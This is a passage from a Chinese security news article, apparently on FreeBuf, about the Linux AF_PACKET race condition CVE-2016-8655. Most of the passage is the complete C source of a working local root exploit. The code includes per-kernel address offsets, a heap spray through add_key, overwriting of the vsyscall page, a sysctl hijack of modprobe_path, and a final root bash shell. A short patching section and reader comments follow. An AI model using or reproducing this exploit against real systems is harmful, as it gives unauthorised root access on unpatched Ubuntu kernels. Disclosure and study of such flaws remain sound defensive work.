    {"4.4.0-22-generic #40",0xffffffff81087d40,0xffffffff81e48f00,0xffffffff812864d0,0xffffffff8106f370},
    {"4.2.0-18-generic #22~14.04.1",0xffffffff8107d620,0xffffffff81c49780,0xffffffff8125dd10,0xffffffff81067760},
    {"4.4.0-34-generic #53",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286ed0,0xffffffff8106f370},
    {"4.2.0-22-generic #27",0xffffffff81081ad0,0xffffffff81c486c0,0xffffffff81273b20,0xffffffff8106b100},
    {"4.2.0-23-generic #28",0,0,0,0},
    {"4.2.0-25-generic #30",0,0,0,0},
    {"4.4.0-36-generic #55",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286e50,0xffffffff8106f360},
    {"4.2.0-42-generic #49",0xffffffff81083490,0xffffffff81e489a0,0xffffffff81277870,0xffffffff8106c680},
    {"4.4.0-31-generic #50",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286e90,0xffffffff8106f370},
    {"4.4.0-22-generic #40~14.04.1",0xffffffff81084250,0xffffffff81c4b080,0xffffffff81273de0,0xffffffff8106b9d0},
    {"4.2.0-38-generic #45",0xffffffff810833d0,0xffffffff81e488e0,0xffffffff81277410,0xffffffff8106c680},
    {"4.4.0-45-generic #66",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874c0,0xffffffff8106f320},
    {"4.2.0-36-generic #42~14.04.1",0xffffffff8107ffd0,0xffffffff81c499e0,0xffffffff81261ea0,0xffffffff81069d00},
    {"4.4.0-45-generic #66~14.04.1",0xffffffff81084260,0xffffffff81e4b100,0xffffffff81274340,0xffffffff8106b880},
    {"4.2.0-22-generic #27~14.04.1",0xffffffff8107d640,0xffffffff81c497c0,0xffffffff8125deb0,0xffffffff81067750},
    {"4.2.0-25-generic #30~14.04.1",0,0,0,0},
    {"4.2.0-23-generic #28~14.04.1",0,0,0,0},
    {"4.4.0-46-generic #67",0xffffffff81088040,0xffffffff81e48f80,0xffffffff81287800,0xffffffff8106f320},
    {"4.4.0-47-generic #68",0,0,0,0},
    {"4.4.0-34-generic #53~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c40,0xffffffff8106b880},
    {"4.4.0-36-generic #55~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c60,0xffffffff8106b890},
    {"4.4.0-31-generic #50~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c20,0xffffffff8106b880},
    {"4.2.0-38-generic #45~14.04.1",0xffffffff8107fdc0,0xffffffff81c4a9e0,0xffffffff81261540,0xffffffff81069bf0},
    {"4.2.0-35-generic #40",0xffffffff81083430,0xffffffff81e48860,0xffffffff81277240,0xffffffff8106c680},
    {"4.4.0-24-generic #43~14.04.1",0xffffffff81084120,0xffffffff81c4b080,0xffffffff812736f0,0xffffffff8106b880},
    {"4.4.0-21-generic #37",0xffffffff81087cf0,0xffffffff81e48e80,0xffffffff81286310,0xffffffff8106f370},
    {"4.2.0-34-generic #39~14.04.1",0xffffffff8107dc50,0xffffffff81c498e0,0xffffffff8125e830,0xffffffff81067c90},
    {"4.4.0-24-generic #43",0xffffffff81087e60,0xffffffff81e48f00,0xffffffff812868f0,0xffffffff8106f370},
    {"4.4.0-21-generic #37~14.04.1",0xffffffff81084220,0xffffffff81c4b000,0xffffffff81273a30,0xffffffff8106b9d0},
    {"4.2.0-41-generic #48~14.04.1",0xffffffff8107fe20,0xffffffff81c4aa20,0xffffffff812616c0,0xffffffff81069bf0},
    {"4.8.0-27-generic #29",0xffffffff8108ab70,0xffffffff81e47880,0xffffffff812b3490,0xffffffff8106f0d0},
    {"4.8.0-26-generic #28",0,0,0,0},
    {"4.4.0-38-generic #57",0xffffffff81087f70,0xffffffff81e48f80,0xffffffff81287470,0xffffffff8106f360},
    {"4.4.0-42-generic #62~14.04.1",0xffffffff81084260,0xffffffff81e4b100,0xffffffff81274300,0xffffffff8106b880},
    {"4.4.0-38-generic #57~14.04.1",0xffffffff81084210,0xffffffff81e4b100,0xffffffff812742e0,0xffffffff8106b890},
    {"4.4.0-49-generic #70",0xffffffff81088090,0xffffffff81e48f80,0xffffffff81287d40,0xffffffff8106f320},
    {"4.4.0-49-generic #70~14.04.1",0xffffffff81084350,0xffffffff81e4b100,0xffffffff81274b10,0xffffffff8106b880},
    {"4.2.0-21-generic #25",0xffffffff81081ad0,0xffffffff81c486c0,0xffffffff81273aa0,0xffffffff8106b100},
    {"4.2.0-19-generic #23",0,0,0,0},
    {"4.2.0-42-generic #49~14.04.1",0xffffffff8107fe20,0xffffffff81c4aaa0,0xffffffff81261980,0xffffffff81069bf0},
    {"4.4.0-43-generic #63",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874b0,0xffffffff8106f320},
    {"4.4.0-28-generic #47",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286df0,0xffffffff8106f370},
    {"4.4.0-28-generic #47~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273b70,0xffffffff8106b880},
    {"4.9.0-1-generic #2",0xffffffff8108bbe0,0xffffffff81e4ac20,0xffffffff812b8400,0xffffffff8106f390},
    {"4.8.0-28-generic #30",0xffffffff8108ae10,0xffffffff81e48b80,0xffffffff812b3690,0xffffffff8106f0e0},
    {"4.2.0-35-generic #40~14.04.1",0xffffffff8107fff0,0xffffffff81c49960,0xffffffff81262320,0xffffffff81069d20},
    {"4.2.0-27-generic #32",0xffffffff810820c0,0xffffffff81c487c0,0xffffffff81274150,0xffffffff8106b620},
    {"4.4.0-42-generic #62",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874a0,0xffffffff8106f320},
    {"4.4.0-51-generic #72",0xffffffff81088090,0xffffffff81e48f80,0xffffffff812879a0,0xffffffff8106f320},
//{"4.8.6-300.fc25.x86_64 #1 SMP Tue Nov 1 12:36:38 UTC 2016",0xffffffff9f0a8b30,0xffffffff9fe40940,0xffffffff9f2cfbf0,0xffffffff9f0663b0},
    {NULL,0,0,0,0}
};

#define VSYSCALL 0xffffffffff600000

#define PAD 64

int pad_fds[PAD];

struct ctl_table {
    const char *procname;
    void *data;
    int maxlen;
    unsigned short mode;
    struct ctl_table *child;
    void *proc_handler;
    void *poll;
    void *extra1;
    void *extra2;
};

#define CONF_RING_FRAMES 1

struct tpacket_req3 tp;
int sfd;
int mapped = 0;

struct timer_list {
    void *next;
    void *prev;
    unsigned long           expires;
    void                    (*function)(unsigned long);
    unsigned long           data;
    unsigned int                     flags;
    int                     slack;
};

void *setsockopt_thread(void *arg)
{
    while(barrier) {
    }
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &amp;tp, sizeof(tp));

    return NULL;
}

void *vers_switcher(void *arg)
{
    int val,x,y;

    while(barrier) {}

    while(1) {
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, sizeof(val));

        y++;

        if(x != 0) break;

        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, sizeof(val));

        if(x != 0) break;

        y++;
    }

    fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
    vers_switcher_done = 1;


    return NULL;
}

#define BUFSIZE 1408
char exploitbuf[BUFSIZE];

void kmalloc(void)
{
    while(1)
        syscall(__NR_add_key, "user","wtf",exploitbuf,BUFSIZE-24,-2);
}


void pad_kmalloc(void)
{
    int x;

    for(x=0; x&lt;PAD; x++)
        if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == -1) {
            fprintf(stderr,"pad_kmalloc() socket error\n");
            exit(1);
        }

}

int try_exploit(unsigned long func, unsigned long arg, void *verification_func)
{
    pthread_t setsockopt_thread_thread,a;
    int val;
    socklen_t l;
    struct timer_list *timer;
    int fd;
    struct tpacket_block_desc *pbd;
    int off;
    sigset_t set;

    sigemptyset(&amp;set);

    sigaddset(&amp;set, SIGSEGV);

    if(pthread_sigmask(SIG_BLOCK, &amp;set, NULL) != 0) {
        fprintf(stderr,"couldn't set sigmask\n");
        exit(1);
    }

    fprintf(stderr,"new exploit attempt starting, jumping to %p, arg=%p\n",(void *)func,(void *)arg);

    pad_kmalloc();

    fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

    if (fd==-1) {
        printf("target socket error\n");
        exit(1);
    }

    pad_kmalloc();

    fprintf(stderr,"sockets allocated\n");

    val = TPACKET_V3;

    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &amp;val, sizeof(val));

    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;

//try to set the timeout to 10 seconds
//the default timeout might still be used though depending on when the race was won
    tp.tp_retire_blk_tov = 10000;

    sfd = fd;

    if(pthread_create(&amp;setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }


    pthread_create(&amp;a, NULL, vers_switcher, (void *)NULL);

    usleep(200000);

    fprintf(stderr,"removing barrier and spraying..\n");

    memset(exploitbuf,'\x00',BUFSIZE);

    timer = (struct timer_list *)(exploitbuf+(0x6c*8)+6-8);
    timer-&gt;next = 0;
    timer-&gt;prev = 0;

    timer-&gt;expires = 4294943360;
    timer-&gt;function = (void *)func;
    timer-&gt;data = arg;
    timer-&gt;flags = 1;
    timer-&gt;slack = -1;


    barrier = 0;

    usleep(100000);

    while(!vers_switcher_done)usleep(100000);

    l = sizeof(val);
    getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &amp;val, &amp;l);

    fprintf(stderr,"current packet version = %d\n",val);

    pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);


    if(pbd == MAP_FAILED) {
        fprintf(stderr,"could not map pbd\n");
        exit(1);
    }

    else {
        off = pbd-&gt;hdr.bh1.offset_to_first_pkt;
        fprintf(stderr,"pbd-&gt;hdr.bh1.offset_to_first_pkt = %d\n",off);
    }


    if(val == TPACKET_V1 &amp;&amp; off != 0) {
        fprintf(stderr,"*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*\n");
    }

    else {
        fprintf(stderr,"race not won\n");
        exit(2);
    }

    munmap(pbd, tp.tp_block_size * tp.tp_block_nr);

    pthread_create(&amp;a, NULL, verification_func, (void *)NULL);

    fprintf(stderr,"please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.\n");
    sleep(1);
    fprintf(stderr,"closing socket and verifying..");

    close(sfd);

    kmalloc();

    fprintf(stderr,"all messages sent\n");

    sleep(31337);
    exit(1);
}


int verification_result = 0;

void catch_sigsegv(int sig)
{
    verification_result = 0;
    pthread_exit((void *)1);
}


void *modify_vsyscall(void *arg)
{
    unsigned long *vsyscall = (unsigned long *)(VSYSCALL+0x850);
    unsigned long x = (unsigned long)arg;

    sigset_t set;
    sigemptyset(&amp;set);
    sigaddset(&amp;set, SIGSEGV);

    if(pthread_sigmask(SIG_UNBLOCK, &amp;set, NULL) != 0) {
        fprintf(stderr,"couldn't set sigmask\n");
        exit(1);
    }

    signal(SIGSEGV, catch_sigsegv);

    *vsyscall = 0xdeadbeef+x;

    if(*vsyscall == 0xdeadbeef+x) {
        fprintf(stderr,"\nvsyscall page altered!\n");
        verification_result = 1;
        pthread_exit(0);
    }

    return NULL;
}

void verify_stage1(void)
{
    int x;
    pthread_t v_thread;

    sleep(5);

    for(x=0; x&lt;300; x++) {

        pthread_create(&amp;v_thread, NULL, modify_vsyscall, 0);

        pthread_join(v_thread, NULL);

        if(verification_result == 1) {
            exit(0);
        }

        write(2,".",1);
        sleep(1);
    }

    printf("could not modify vsyscall\n");

    exit(1);
}

void verify_stage2(void)
{
    int x;
    struct stat b;

    sleep(5);

    for(x=0; x&lt;300; x++) {

        if(stat("/proc/sys/hack",&amp;b) == 0) {
            fprintf(stderr,"\nsysctl added!\n");
            exit(0);
        }

        write(2,".",1);
        sleep(1);
    }

    printf("could not add sysctl\n");
    exit(1);


}

void exploit(unsigned long func, unsigned long arg, void *verification_func)
{
    int status;
    int pid;

retry:

    pid = fork();

    if(pid == 0) {
        try_exploit(func, arg, verification_func);
        exit(1);
    }

    wait(&amp;status);

    printf("\n");

    if(WEXITSTATUS(status) == 2) {
        printf("retrying stage..\n");
        kill(pid, 9);
        sleep(2);
        goto retry;
    }

    else if(WEXITSTATUS(status) != 0) {
        printf("something bad happened, aborting exploit attempt\n");
        exit(-1);
    }



    kill(pid, 9);
}


void wrapper(void)
{
    struct ctl_table *c;

    fprintf(stderr,"exploit starting\n");
    printf("making vsyscall page writable..\n\n");

    exploit(off-&gt;set_memory_rw, VSYSCALL, verify_stage1);

    printf("\nstage 1 completed\n");

    sleep(5);

    printf("registering new sysctl..\n\n");

    c = (struct ctl_table *)(VSYSCALL+0x850);

    memset((char *)(VSYSCALL+0x850), '\x00', 1952);

    strcpy((char *)(VSYSCALL+0xf00),"hack");
    memcpy((char *)(VSYSCALL+0xe00),"\x01\x00\x00\x00",4);
    c-&gt;procname = (char *)(VSYSCALL+0xf00);
    c-&gt;mode = 0666;
    c-&gt;proc_handler = (void *)(off-&gt;proc_dostring);
    c-&gt;data = (void *)(off-&gt;modprobe_path);
    c-&gt;maxlen=256;
    c-&gt;extra1 = (void *)(VSYSCALL+0xe00);
    c-&gt;extra2 = (void *)(VSYSCALL+0xd00);

    exploit(off-&gt;register_sysctl_table, VSYSCALL+0x850, verify_stage2);

    printf("stage 2 completed\n");
}

void launch_rootshell(void)
{
    int fd;
    char buf[256];
    struct stat s;


    fd = open("/proc/sys/hack",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"could not open /proc/sys/hack\n");
        exit(-1);
    }

    memset(buf,'\x00', 256);

    readlink("/proc/self/exe",(char *)&amp;buf,256);

    write(fd,buf,strlen(buf)+1);

    socket(AF_INET,SOCK_STREAM,132);

    if(stat(buf,&amp;s) == 0 &amp;&amp; s.st_uid == 0) {
        printf("binary executed by kernel, launching rootshell\n");
        lseek(fd, 0, SEEK_SET);
        write(fd,"/sbin/modprobe",15);
        close(fd);
        execl(buf,buf,NULL);
    }

    else
        printf("could not create rootshell\n");


}

int main(int argc, char **argv)
{
    int status, pid;
    struct utsname u;
    int i, crash = 0;
    char buf[512], *f;


    if(argc == 2 &amp;&amp; !strcmp(argv[1],"crash")) {
        crash = 1;
    }


    if(getuid() == 0 &amp;&amp; geteuid() == 0 &amp;&amp; !crash) {
        chown("/proc/self/exe",0,0);
        chmod("/proc/self/exe",06755);
        exit(-1);
    }

    else if(getuid() != 0 &amp;&amp; geteuid() == 0 &amp;&amp; !crash) {
        setresuid(0,0,0);
        setresgid(0,0,0);
        execl("/bin/bash","bash","-p",NULL);
        exit(0);
    }

    fprintf(stderr,"linux AF_PACKET race condition exploit by rebel\n");

    uname(&amp;u);

    if((f = strstr(u.version,"-Ubuntu")) != NULL) *f = '\0';

    snprintf(buf,512,"%s %s",u.release,u.version);

    printf("kernel version: %s\n",buf);


    for(i=0; offsets[i].kernel_version != NULL; i++) {
        if(!strcmp(offsets[i].kernel_version,buf)) {

            while(offsets[i].proc_dostring == 0)
                i--;

            off = &amp;offsets[i];
            break;
        }
    }

    if(crash) {
        off = &amp;offsets[0];
        off-&gt;set_memory_rw = 0xffffffff41414141;
    }

    if(off) {
        printf("proc_dostring = %p\n",(void *)off-&gt;proc_dostring);
        printf("modprobe_path = %p\n",(void *)off-&gt;modprobe_path);
        printf("register_sysctl_table = %p\n",(void *)off-&gt;register_sysctl_table);
        printf("set_memory_rw = %p\n",(void *)off-&gt;set_memory_rw);
    }

    if(!off) {
        fprintf(stderr,"i have no offsets for this kernel version..\n");
        exit(-1);
    }

    pid = fork();

    if(pid == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if(unshare(CLONE_NEWNET) != 0)
            fprintf(stderr, "failed to create new network namespace\n");

        wrapper();
        exit(0);
    }

    waitpid(pid, &amp;status, 0);

    launch_rootshell();
    return 0;
}<br /></code></pre>
<h2>修复方法</h2>
<p>如上所述，各Linux发行版需要升级至最新版Linux内核。针对Ubuntu 16.04 LTS的安全更新已经发布。另外<a href="https://www.cyberciti.biz/faq/howto-live-patch-ubuntu-linux-server-kernel-without-rebooting/" target="_blank">这篇文章</a>讲解了在不重启服务器的情况下，就对Ubuntu Linux内核打上补丁的方案。</p>
<p style="text-align: center;"><img alt="Screen-Shot-2016-10-19-at-5.06.29-PM.png" data-original="http://image.3001.net/images/20161208/14811679594584.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="599" height="401"></p>
<noscript><img alt="Screen-Shot-2016-10-19-at-5.06.29-PM.png" src="http://image.3001.net/images/20161208/14811679594584.png!small" width="599" height="401"></p></noscript>
<h2>相关链接</h2>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-8655</a></p>
<p><a href="https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a">https://github.com/torvalds/linux/commit/f6fb8f100b807378fda19e83e5ac6828b638603a</a></p>
<p><a href="https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c">https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c</a></p>
<p><a href="https://www.ubuntu.com/usn/usn-3151-1/">https://www.ubuntu.com/usn/usn-3151-1/</a></p>
<p><b style="color: rgb(159, 163, 168);">* 参考来源：<a href="http://seclists.org/oss-sec/2016/q4/607" target="_blank">Seclists.org</a>，转载请注明来自FreeBuf.COM</b></p>
        </div>
        <div class="article-oper article-oper-new">
			<style>
				@font-face {font-family: 'iconfont';
					src: url('http://static.3001.net/iconfonts/iconfont.eot'); /* IE9*/
					src: url('http://static.3001.net/iconfonts/iconfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
					url('http://static.3001.net/iconfonts/iconfont.woff') format('woff'), /* chrome、firefox */
					url('http://static.3001.net/iconfonts/iconfont.ttf') format('truetype'), /* chrome、firefox、opera、Safari, Android, iOS 4.2+*/
					url('http://static.3001.net/iconfonts/iconfont.svg#iconfont') format('svg'); /* iOS 4.1- */
				}
			</style>
			<div class="share-new">
				<div class="share-author">
											<a href="http://www.freebuf.com/author/漏洞盒子" title="由 漏洞盒子 发布" rel="author">
							<img src="http://image.3001.net/2014/06/0.jpg" width="50" height="50" alt="漏洞盒子" class="avatar avatar-50 wp-user-avatar wp-user-avatar-50 photo" />							<!--							<img src="http://image.3001.net/2015/06/17.jpg" alt="ArthurKiller">-->
						</a>
						<div class="share-author-info">
														<a class="author-name" href="http://www.freebuf.com/author/漏洞盒子">漏洞盒子</a>
							<!--<span class="icon-f"></span>-->
							<span><i class="colour-red">84</i>篇文章</span><span>等级：<i class="colour-green">7</i>级</span>
						</div>
									</div>
				<div class="user-center clearfix">
					<a href="http://www.freebuf.com/author/漏洞盒子" title="个人主页" target="_blank">&#xe61b;</a>
					<a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=漏洞盒子" title="私信" target="_blank">&#xe611;</a>
<!--					<a href="http://www.freebuf.com/author/ArthurKiller" title="个人主页">&#xe61b;</a>-->
<!--					<a href="http://www.freebuf.com/user/pm?pmaction=newmessage&to=ArthurKiller" title="私信">&#xe611;</a>-->
				</div>
				<div class="share-ctrl clearfix">
					<div class="bdsharebuttonbox clearfix">
						<a href="#" data-cmd="tsina" title="分享到新浪微博">&#xe618;</a>
						<a href="#" data-cmd="weixin" title="分享到微信" id="weixin">&#xe60a;</a>
						<a href="#" data-cmd="qzone" title="分享到QQ空间">&#xe640;</a>
						<a href="#">|</a>
					</div>
				</div>
				<div class="user-ctrl clearfix">
										<a href="http://www.freebuf.com/oauth" title="收藏" class="like-grey">&#xe798;</a>
					<!--					<a href="#" title="收藏" class="like-grey">&#xe798;</a>-->
<!--					<a href="#" title="收藏" class="like-red"><img src="http://image.3001.net/images/new/user-like.png" /></a>-->
					<a href="#respond" title="评论">&#xe615;</a>
					<!--					<a href="#" title="文章纠正">&#xe6e3;</a>-->
					<a href="#">|</a>
					<span class="info-alert"></span>
				</div>
			</div>
			<script>
				window._bd_share_config={
					"common": {
						"bdSnsKey": {},
						"bdText": "",
						"bdMini": "2",
						"bdMiniList": ["qzone", "tsina", "weixin"],
						"bdPic": "",
						"bdStyle": "1",
						"bdSize": "24"
					},
					"share":{},
				};
				with(document)0[
					(getElementsByTagName('head')[0]||body).
					appendChild(createElement('script')).
						src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)
					];
				//控制垂直方向分享模块的定位
				function shareFixVertical(){
					var offsetTop = jQuery(".article-oper").get(0).offsetTop;
					var win_h = jQuery(window).height();
					var win_w = jQuery(window).width();
					var scrollTop = document.body.scrollTop||document.documentElement.scrollTop;
					var _height = offsetTop-scrollTop;
					if(_height>=win_h-130&&win_w>975){
						var _width = jQuery("#getWidth").innerWidth()-30;
						var _left = jQuery("#getWidth").offset().left+15;
						jQuery(".share-new").addClass("fixed");
						jQuery(".fixed").css({
							width:_width,
							left:_left
						});

					}else{
						jQuery(".share-new").removeClass("fixed");
						jQuery(".share-new").css({
							width: "100%"
						});
					}
				}
				//控制水平方向分享模块的定位
				function shareFixHorizontal(){
					var _width = jQuery("#getWidth").innerWidth()-30;
					var _left = jQuery("#getWidth").get(0).offsetLeft+15;
					var win_w = document.documentElement.clientWidth || document.body.clientWidth;
					console.log(win_w);
					jQuery(".fixed").css({
						width:_width,
						left:_left
					});
					if(win_w< 975){
						jQuery(".share-new").css({
							width: "100%",
							left: "0"
						});
					}else{
						var _width = jQuery("#getWidth").innerWidth()-30;
						var _left = jQuery("#getWidth").get(0).offsetLeft+15;
						jQuery(".fixed").css({
							width:_width,
							left:_left
						});
					}
				}

				jQuery(window).on("load",function(){
					shareFixVertical();
				});

				jQuery(window).on("scroll",function(){
					shareFixVertical();
				});

				jQuery(window).on("resize",function(){
					shareFixHorizontal();
				})
				$(document).click(function(e){
					if($(e.target).attr("id")=="weixin"){
						$("#bdshare_weixin_qrcode_dialog").show();
					}else{
						$("#bdshare_weixin_qrcode_dialog").hide();
					}
				})
			</script>
        </div>
                        		        <div class="article-pager">
          <ul>
            <li class="previous"><span>上一篇：</span><a href="http://www.freebuf.com/news/121969.html" rel="prev">“鑫胖”家的红星3.0系统被曝漏洞，可远程执行任意命令注入</a>			</li>
            <li class="next"><span>下一篇：</span>
			<a href="http://www.freebuf.com/vuls/122139.html" rel="next">【漏洞预警】ImageMagick压缩TIFF图片远程代码执行漏洞（CVE-2016-8707）</a>			</li>
          </ul>
        </div>
      </div>
      </div>
          <div class="comment-bright"><div class="main-tit04">
    <h3>这些评论亮了</h3></div>      <ul>      <li>
            <div class="user_photo">             <img src="http://image.3001.net/images/headimg/pic6.png">             </div>
            <div class="tit"><span class="name"> 呵呵 </span> 
						<span class="explain"></span>
			<span class="reply"><a onclick="return addComment.moveForm( 'comment-','', 'respond','122152' ) " href="?replytocom=#respond" class="comment-reply-link" rel="nofollow">回复</a></span></div>
            <div class="txt">
						@ cnhacks    我就笑笑不说话。<br/><a href=http://image.3001.net/images/20161208/14811757219467.jpg target="_blank" title="" data_ue_src=http://image.3001.net/images/20161208/14811757219467.jpg class="highslide-image" onclick="return hs.expand(this);"><strong style="color: rgb(38, 38, 38);"><strong><img data-original=http://image.3001.net/images/20161208/14811757219467.jpg src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></strong></strong></a></div>
            <div class="but"><span class="vote-count">)</span><span style="none" id="cos_support-2203712" class="vote-count">9</span><span class="vote-count">(</span><span class="vote">  <a class="ilike_icon" id="vote4-2203712" href="javascript:acv_vote(203712,1,2);">亮了</a></span></div>
          </li>
         </ul></div><div class="comment-list">
      <div class="main-tit02">
		<a rel="nofollow" class="btnbtn-default btn-comment" href="#respond">发表评论</a>
        <h3>已有 <span class="color_red">21</span> 条评论
      </div>
      <ul>
         <li class="comment byuser comment-author-raman even thread-even depth-1" id="li-comment-203584">
    <div id="comment-203584">
        <div class="photo"> <a href="http://www.freebuf.com/author/raman">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/raman" target="_blank">raman&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(3级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2016-12-07</span>
		<span class="time"> </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-203584','203584', 'respond','122152' ) " href="?replytocom=203584#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor">1楼</span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>说好的POC呢</p>
<div class="comment-tools">
<div class="vote" id="vote-203584"><span id="acv_stat_203584"></span><a class="ilike_icon"  id="vote4-203584" href="javascript:acv_vote(203584,1);">亮了</a>(<span id="cos_support-203584">3</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="203584" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="203584" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="203584" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="203584" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="203584" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment odd alt depth-2" id="li-comment-203603">
    <div id="comment-203603">
        <div class="photo">     <img src="http://image.3001.net/images/headimg/pic1.png">     </div>
    <div class="tit"> 
	    <span class="name"> yyy3333 </span>
        		<span class="explain">  </span>
		<span class="time">&nbsp;2016-12-07</span>
		<span class="time"> </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		        <!-- 正常情况 -->
           <a onclick="return addComment.moveForm( 'comment-203603','203603', 'respond','122152' ) " href="?replytocom=203603#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ raman    明天放出……等楼主中出就好了</p>
<div class="comment-tools">
<div class="vote" id="vote-203603"><span id="acv_stat_203603"></span><a class="ilike_icon"  id="vote4-203603" href="javascript:acv_vote(203603,1);">亮了</a>(<span id="cos_support-203603">4</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="203603" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="203603" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="203603" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="203603" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="203603" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
<ul class="children">
<li class="comment byuser comment-author-cnhacks even depth-3" id="li-comment-203656">
    <div id="comment-203656">
        <div class="photo"> <a href="http://www.freebuf.com/author/cnhacks">
    <img src="http://www.freebuf.com/buf/plugins/wp-user-avatar/images/wp-user-avatar-96x96.png"></a>
     </div>
    <div class="tit"> 
	    <span class="name"> <a href="http://www.freebuf.com/author/cnhacks" target="_blank">cnhacks&nbsp;</a>  </span>
        		
		<span class="icon-f"> </span>
		<span class="rank">(3级)</span>
				<span class="explain">  </span>
		<span class="time">&nbsp;2016-12-07</span>
		<span class="time"> </span>
        <span class="useragent_output_custom"></span>
        <span class="useragent_output_custom"></span> 
		<span class="reply">
		           <a onclick="return addComment.moveForm( 'comment-203656','203603', 'respond','122152' )" href="?replytocom=203656#respond" class="comment-reply-link" rel="nofollow">回复</a>
        	    </span>
		<span class="floor"></span>
	</div>
	    <div class="txt">
	  <p class="useragent_output_custom"></p>
      <p>@ yyy3333  安全客 网站早4个小时就发了。POC也已经有了。</p>
<div class="comment-tools">
<div class="vote" id="vote-203656"><span id="acv_stat_203656"></span><a class="ilike_icon"  id="vote4-203656" href="javascript:acv_vote(203656,1);">亮了</a>(<span id="cos_support-203656">1</span>)</div>
<div class="dropup"><a class="dropdown-toggle btn-report" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" style="display:none;"> 举报</a>
<ul class="dropdown-menu" style="display:none;bottom:auto;">
<li><a data-id="203656" class="click_report" href="javascript:;">广告等垃圾信息</a></li>
<li><a data-id="203656" class="click_report" href="javascript:;">不友善内容</a></li>
<li><a data-id="203656" class="click_report" href="javascript:;">违反法律法规的内容</a></li>
<li><a data-id="203656" class="click_report" href="javascript:;">不宜公开讨论的政治内容</a></li>
<li><a data-id="203656" class="click_report" href="javascript:;">其他</a></li>
</ul></div>
</div>
	</div></div>
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
